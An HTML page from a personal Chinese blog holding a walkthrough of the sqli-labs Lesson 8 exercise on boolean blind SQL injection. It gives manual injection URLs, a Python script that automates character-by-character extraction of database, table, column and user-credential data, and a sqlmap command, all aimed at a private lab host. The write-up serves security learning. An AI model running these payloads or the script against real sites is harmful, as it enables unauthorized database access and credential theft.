<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#fff">












<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">



















  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/fish-32x32.png?v=6.4.1">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/fish-16x16.png?v=6.4.1">


  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#fff">



  <meta name="msapplication-config" content="/images/browserconfig.xml">







<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '6.4.1',
    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="sqli-labs-lession 8 GET单引号布尔型盲注登录界面 手注注入点http://10.60.250.151/sqlilabs/Less-8/?id=1&amp;#39;  没有信息显示,但是页面改变了 http://10.60.250.151/sqlilabs/Less-8/?id=1&amp;#39;%23  判断为单引号闭合 获取字段数http://10.60.250.151/sqlilabs">
<meta name="keywords" content="sqli-labs">
<meta property="og:type" content="article">
<meta property="og:title" content="sqli-labs-lession 8 GET单引号布尔型盲注">
<meta property="og:url" content="https://yingyingguaier.github.io/2018/09/26/sqli-labs-lession-8-GET单引号布尔型盲注/index.html">
<meta property="og:site_name" content="0menc&#39;s Blog">
<meta property="og:description" content="sqli-labs-lession 8 GET单引号布尔型盲注登录界面 手注注入点http://10.60.250.151/sqlilabs/Less-8/?id=1&amp;#39;  没有信息显示,但是页面改变了 http://10.60.250.151/sqlilabs/Less-8/?id=1&amp;#39;%23  判断为单引号闭合 获取字段数http://10.60.250.151/sqlilabs">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/1.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/4.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/5.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/6.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/7.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/8.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/9.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/10.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/11.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/12.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/13.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/14.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/15.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/16.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/17.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/18.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/19.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/20.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/21.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/3.png">
<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/2.png">
<meta property="og:updated_time" content="2019-06-19T17:23:13.400Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="sqli-labs-lession 8 GET单引号布尔型盲注">
<meta name="twitter:description" content="sqli-labs-lession 8 GET单引号布尔型盲注登录界面 手注注入点http://10.60.250.151/sqlilabs/Less-8/?id=1&amp;#39;  没有信息显示,但是页面改变了 http://10.60.250.151/sqlilabs/Less-8/?id=1&amp;#39;%23  判断为单引号闭合 获取字段数http://10.60.250.151/sqlilabs">
<meta name="twitter:image" content="https://yingyingguaier.github.io/img/sql/Lesson-8/1.png">






  <link rel="canonical" href="https://yingyingguaier.github.io/2018/09/26/sqli-labs-lession-8-GET单引号布尔型盲注/">



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>sqli-labs-lession 8 GET单引号布尔型盲注 | 0menc's Blog</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>
<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-right page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">0menc's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <p class="site-subtitle">学习、踩坑及经验分享</p>
      
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-commonweal">
    <a href="/404.html" rel="section">
      <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>Commonweal 404</a>
  </li>

      
      
    </ul>
  

  
    

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://yingyingguaier.github.io/2018/09/26/sqli-labs-lession-8-GET单引号布尔型盲注/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="嘤嘤怪er">
      <meta itemprop="description" content="0menc">
      <meta itemprop="image" content="/images/jack.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0menc's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">sqli-labs-lession 8 GET单引号布尔型盲注
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-09-26 11:17:37" itemprop="dateCreated datePublished" datetime="2018-09-26T11:17:37+08:00">2018-09-26</time>
            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/sql注入/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="sqli-labs-lession-8-GET单引号布尔型盲注"><a href="#sqli-labs-lession-8-GET单引号布尔型盲注" class="headerlink" title="sqli-labs-lession 8 GET单引号布尔型盲注"></a>sqli-labs-lession 8 GET单引号布尔型盲注</h1><h2 id="登录界面"><a href="#登录界面" class="headerlink" title="登录界面"></a>登录界面</h2><p><img src="/img/sql/Lesson-8/1.png" alt="1"></p>
<h2 id="手注"><a href="#手注" class="headerlink" title="手注"></a>手注</h2><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39;</code></p>
<p><img src="/img/sql/Lesson-8/4.png" alt="4"></p>
<p>没有信息显示,但是页面改变了</p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39;%23</code></p>
<p><img src="/img/sql/Lesson-8/5.png" alt="5"></p>
<p>判断为单引号闭合</p>
<h3 id="获取字段数"><a href="#获取字段数" class="headerlink" title="获取字段数"></a>获取字段数</h3><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; order by 3%23</code></p>
<p><img src="/img/sql/Lesson-8/6.png" alt="6"></p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; order by 4%23</code></p>
<p><img src="/img/sql/Lesson-8/7.png" alt="7"></p>
<p><code>order by 3</code>出现<code>You are in</code>,<code>order by 4</code>没有,确认字段数为3。</p>
<h3 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h3><h4 id="获取数据库名长度"><a href="#获取数据库名长度" class="headerlink" title="获取数据库名长度"></a>获取数据库名长度</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 8=length(database())%23</code></p>
<p><img src="/img/sql/Lesson-8/8.png" alt="8"></p>
<h4 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><p>left(str,n):截取字段<code>str</code>左侧的n个字符。</p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and &#39;s&#39;=left(database(),1)%23</code></p>
<p>返回正确页面,确认第一个字符是<code>s</code></p>
<p><img src="/img/sql/Lesson-8/9.png" alt="9"></p>
<pre><code>中间都是同样的确认过程...</code></pre><p>这样手动确认,直到数据库名长度测完(十分费力…),下面是最终结果</p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and &#39;security&#39;=left(database(),8)%23</code></p>
<p><img src="/img/sql/Lesson-8/10.png" alt="10"></p>
<h3 id="获取表"><a href="#获取表" class="headerlink" title="获取表"></a>获取表</h3><h4 id="获取表数"><a href="#获取表数" class="headerlink" title="获取表数"></a>获取表数</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 4=(select count(table_name) from information_schema.tables where table_schema=&#39;security&#39;)%23</code></p>
<p><img src="/img/sql/Lesson-8/11.png" alt="11"></p>
<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><p>采用二分法。</p>
<p>以下返回<code>You are in</code>表示<code>True</code>,无返回表示<code>Flase</code></p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 95&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>
<p>95:True</p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 109&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>
<p>109:Flase</p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 102&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>
<p>102:Flase</p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 98&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>
<p>98:True</p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 100&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>
<p>100:True</p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 101&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>
<p>101:True</p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 101=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>
<p><img src="/img/sql/Lesson-8/12.png" alt="12"></p>
<p>确定ascii码值为101,对应的字符为<code>e</code>。</p>
<p>接下来用二分法判断第一个表的第二个字符。</p>
<p>最终能测试出存在下面几张表:</p>
<ul>
<li>emails</li>
<li>referers</li>
<li>uagents</li>
<li>users</li>
</ul>
<h3 id="获取列"><a href="#获取列" class="headerlink" title="获取列"></a>获取列</h3><h4 id="获取列数"><a href="#获取列数" class="headerlink" title="获取列数"></a>获取列数</h4><p>对感兴趣的表获取列数,以users为例。</p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 3=(select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)%23</code></p>
<p><img src="/img/sql/Lesson-8/13.png" alt="13"></p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 4=(select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)%23</code></p>
<p><img src="/img/sql/Lesson-8/14.png" alt="14"></p>
<p>根据上面两张图可以发现<code>users</code>的列数有3个。</p>
<h4 id="获取列长度"><a href="#获取列长度" class="headerlink" title="获取列长度"></a>获取列长度</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 2=length((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1))%23</code></p>
<p><img src="/img/sql/Lesson-8/15.png" alt="15"></p>
<p>说明<code>users</code>表中第一列长度为2。</p>
<p>可以测试出总共3列长度分别为:2,8,8。</p>
<h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><p>采用二分法。</p>
<p>以下返回<code>You are in</code>表示<code>True</code>,无返回表示<code>Flase</code></p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 95&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>
<p>95:True</p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 109&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>
<p>109:False</p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 102&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>
<p>102:True</p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 106&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>
<p>106:False</p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 104&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>
<p>104:True</p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 105&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>
<p>105:True</p>
<p>确定ascii码值为105,对应的字符为<code>i</code>。因为上面查出的列长度为2,再测试第一列的的第二个字符就可以了,还是用二分法查第二个字符。</p>
<p>直接上结果:</p>
<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 100=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),2,1))%23</code></p>
<p><img src="/img/sql/Lesson-8/16.png" alt="16"></p>
<p>ascii码值为100,对应的字符为<code>d</code>,第一列为<code>id</code>,同理可以获取到其他两列为<code>username</code>, <code>password</code>。</p>
<h3 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h3><p>获取字段也和上面的大同小异了,直接给结果。</p>
<p>也是获取字段数量-&gt;获取字段长度-&gt;获取字段名的流程。</p>
<h4 id="获取字段数量"><a href="#获取字段数量" class="headerlink" title="获取字段数量"></a>获取字段数量</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 13=(select count(username) from security.users)%23</code></p>
<p>字段数是13。</p>
<p><img src="/img/sql/Lesson-8/17.png" alt="17"></p>
<h4 id="获取字段长度"><a href="#获取字段长度" class="headerlink" title="获取字段长度"></a>获取字段长度</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 4=length((select username from security.users limit 0,1))%23</code></p>
<p><img src="/img/sql/Lesson-8/18.png" alt="18"></p>
<h4 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 68=ascii(substr((select username from security.users limit 0,1),1,1))%23</code></p>
<p><img src="/img/sql/Lesson-8/19.png" alt="19"></p>
<p>ascii码值为68,对应的字符为<code>D</code>,第一个账户的第一个字母是<code>D</code>。</p>
<p>可以发现上述过程很多都是重复的,可以写个脚本运行。</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>用Python写的一个爆破脚本,没有用二分法,也没封装起来,力度垃圾,凑合着用。</p>
<p>脚本运行结果:</p>
<p><img src="/img/sql/Lesson-8/20.png" alt="20"></p>
<p><img src="/img/sql/Lesson-8/21.png" alt="21"></p>
<pre><code>import requests
db_name = &apos;&apos;#&apos;&apos;security&apos;#数据库名
db_len = 0 #当前数据库长度
table_num = 0#数据库表数目
table_names = &apos;&apos; #数据表名
table_lenlist = [] #数据表名长度列表
table_namelist = [] #数据表名列表
column_numlist = [] #数据表列数
column_lenlist = [] #列名长度列表
column_namelist = [] #列名列表
dump_numlist = []#字段数量列表
url = &apos;http://10.60.250.151/sqlilabs/Less-8/?id=1&apos;
db_payload = &apos;&apos;
i = j = k = l = m = 0

left = 97
right = 123

#查询当前数据库长度
print(&quot;查询当前数据库长度。。。&quot;)
for i in range(1, 21):
    db_payload = &quot;&apos; and %d=(select length(database()))--+&quot; % i
    r = requests.get(url+db_payload)
    if &quot;You are in&quot; in r.text:
        db_len = i
        break
print(&quot;当前数据库长度为&quot;, db_len)

#暴破当前数据库名
print(&quot;暴破当前数据库名...&quot;)
#数据库名长度
for i in range(1, db_len+1):
    #爆破字段区域
    for j in range(left, right):
        db_payload = &quot;&apos; and (left(database(), %d))=&apos;%s&apos;--+&quot; % (i, db_name+chr(j))
        #print(url+db_payload)
        r = requests.get(url+db_payload)
        if &quot;You are in&quot; in r.text:
            db_name += chr(j)
            print(&apos;当前数据库名猜解：&apos;+db_name)
            break
print(&quot;当前数据库名:\n[+]&quot;, db_name)

#数据库中表数目
print(&quot;当前数据库表数目....&quot;)
for i in range(1,100):
    db_payload = &quot;&apos; and %d=(select count(table_name) from information_schema.tables where table_schema=&apos;%s&apos;)--+&quot; % (i, db_name)
    #print(url+db_payload)
    r = requests.get(url+db_payload)
    if &quot;You are in&quot; in r.text:
        table_num = i
        break
print(&quot;当前数据库表数目:&quot;, table_num)

#数据库中表长度
print(&quot;当前数据库表名长度....&quot;)
for i in range(table_num):
    table_len = 0 #表名长度
    #获取数据表长度
    for j in range(1, 21):
        db_payload = &quot;&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %d,1),%d,1))--+&quot; % (db_name, i, j)
        #print(url + db_payload)
        r = requests.get(url + db_payload)
        if &quot;You are in&quot; not in r.text:
            table_len = j - 1
            table_lenlist.append(table_len)
            break
print(&apos;表名长度：&apos;, table_lenlist)

#数据库表名
for i in range(table_num):
    # 获取数据表名
    table_names = &apos;&apos;
    for j in range(1, table_lenlist[i]+1):
        for k in range(left, right):
            db_payload = &quot;&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %d,1),%d,1))=%d--+&quot; % (db_name, i, j, k)
            #print(url+db_payload)
            r = requests.get(url+db_payload)
            if &quot;You are in&quot; in r.text:
                table_names += chr(k)
                print(&quot;当前表名猜解：&quot;, table_names)
                break
    table_namelist.append(table_names)
print(&quot;当前数据表名:\n[+]&quot;, table_namelist)

#数据列数
print(&quot;各个数据表列数...&quot;)
for i in range(table_num):
    #print(i)
    column_num = 0
    for j in range(1, 21):
        db_payload = &quot;&apos; and %d=(select count(column_name) from information_schema.columns where table_name=&apos;%s&apos;)--+&quot; % (j, table_namelist[i])
        #print(url + db_payload)
        r = requests.get(url+db_payload)
        if &quot;You are in&quot; in r.text:
            column_num = j
            #print(&quot;[+]&quot;+table_namelist[i]+&quot;表列数:&quot;+ str(column_num))
            column_numlist.append(column_num)
            break
print(&quot;[+]数据表列数&quot;, column_numlist)

#猜解列长度
print(&quot;猜解列长度....&quot;)
for i in range(column_numlist[3]):
    column_len = 0 #列名长度
     #获取列长度
    for j in range(1, 21):
        db_payload = &quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit %d,1),%d,1))--+&quot; % (i, j)
        #print(url + db_payload)
        r = requests.get(url + db_payload)
        if &quot;You are in&quot; not in r.text:
            column_len = j - 1
            break
    column_lenlist.append(column_len)
print(&apos;user列名长度：&apos;, column_lenlist)

#猜解列名
print(&quot;猜解列名....&quot;)
for i in range(column_numlist[3]):
    column_names = &apos;&apos;
    for j in range(1,column_lenlist[i]+1):
        for k in range(left, right):
            db_payload = &quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit %d,1),%d,1))=%d--+&quot; % (
                i, j, k)
            #print(url + db_payload)
            r = requests.get(url + db_payload)
            if &quot;You are in&quot; in r.text:
                column_names += chr(k)
                print(&quot;当前表名猜解：&quot;, column_names)
                break
    column_namelist.append(column_names)
print(&quot;users列名:\n[+]&quot;, column_namelist)

#爆破字段
print(&quot;爆破字段....&quot;)
print(&apos;开始爆破字段数量：&apos;)
for column in column_namelist[0:]:
    #print(column, &apos;：&apos;)
    dump_num = 0
    #爆破各个字段数量
    for i in range(30):
        db_payload = &quot;&apos; and %d=(select count(%s) from %s.%s)--+&quot; % (i, column, db_name, table_namelist[-1])
        #print(url+db_payload)
        r = requests.get(url+db_payload)
        if &quot;You are in&quot; in r.text:
            dump_num = i
            #print(i)
            break
    dump_numlist.append(dump_num)
print(&apos;字段数：&apos;, dump_numlist)

print(&apos;开始爆破字段：&apos;)
for i in range(len(dump_numlist)):
    print(column_namelist[i]+&quot;:&quot;)
    #####字段个数####
    for j in range(dump_numlist[i]):
        dump_len = 0
        dump_name = &apos;&apos;
        ### 字段长度 ####
        for k in range(1, 21):
            db_payload = &quot;&apos; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+&quot; % (
                column_namelist[i], db_name, table_namelist[-1], j, k)
            r = requests.get(url + db_payload)
            #print(url + db_payload)
            if &quot;You are in&quot; not in r.text:
                dump_len = k - 1
                break
        #print(dump_len)
        for l in range(1, dump_len + 1):
            for m in range(32, 127):
                db_payload = &quot;&apos;and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d--+&quot;  % (
                    column_namelist[i], db_name, table_namelist[-1], j, l, m)
                #print(url + db_payload)
                r = requests.get(url + db_payload)
                if &quot;You are in&quot; in r.text:
                    dump_name += chr(m)
                    break
        print(&apos;[+]&apos;, dump_name)</code></pre><h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><p>跟Lesson-1的过程没有什么大的区别。详细过程可以查看如下。</p>
<a href="/2018/09/18/sqli-labs-lession-1-基于错误的GET单引号字符型注入/" title="点击查看Lesson-1">点击查看Lesson-1</a>

<p>清除session</p>
<p>–flush-session  –fresh-queries</p>
<p><code>sqlmap -u http://10.60.250.151/sqlilabs/Less-8/?id=1 --dbs --technique B --threads 10 --flush-session --fresh-queries</code></p>
<p><img src="/img/sql/Lesson-8/3.png" alt="3"></p>
<p>直接上结果了。</p>
<p><img src="/img/sql/Lesson-8/2.png" alt="2"></p>

      
    </div>

    

    
    
    

    
<div>
  
    <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-heart"></i>感谢阅读-------------</div>
    
</div>
  
</div>
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/sqli-labs/" rel="tag"># sqli-labs</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/09/26/sqli-labs-lession-9-GET单引号基于时间盲注/" rel="prev" title="sqli-labs-lession 9 GET单引号基于时间盲注">
                <i class="fa fa-chevron-left"></i> sqli-labs-lession 9 GET单引号基于时间盲注
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/09/25/sqli-labs-lession-7-文件导入/" rel="next" title="sqli-labs-lession 7 文件导入">
                sqli-labs-lession 7 文件导入 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <a href="/">
                <img class="site-author-image" itemprop="image" src="/images/jack.jpg" alt="嘤嘤怪er">
              </a>
            
              <p class="site-author-name" itemprop="name">嘤嘤怪er</p>
              <p class="site-description motion-element" itemprop="description">0menc</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">101</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">16</span>
                    <span class="site-state-item-name">categories</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">17</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          

          
          

          
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
